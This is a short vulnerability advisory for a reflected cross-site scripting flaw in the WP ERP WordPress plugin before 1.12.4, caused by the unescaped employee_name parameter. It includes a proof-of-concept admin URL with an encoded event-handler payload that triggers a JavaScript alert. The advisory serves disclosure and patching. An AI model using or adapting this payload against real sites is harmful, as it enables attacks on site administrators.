## WordPress Plugin Vulnerabilities

# WP ERP < 1.12.4 - Reflected Cross-Site Scripting

### Description

The plugin does not sanitise and escape the employee\_name parameter before outputting it back in the page, leading to a Reflected Cross-Site Scripting which could be used against high privilege users such as admin.

### Proof of Concept

As an admin user, visit the following URL on the site:
/wp-admin/admin.php?page=erp-hr&section=leave&employee\_name=employee123"+style%3Danimation-name%3Arotation+onanimationstart%3Dalert(%2FXSS%2F)%2F%2F
Click on the "Filter Leave Requests" button to trigger the XSS.
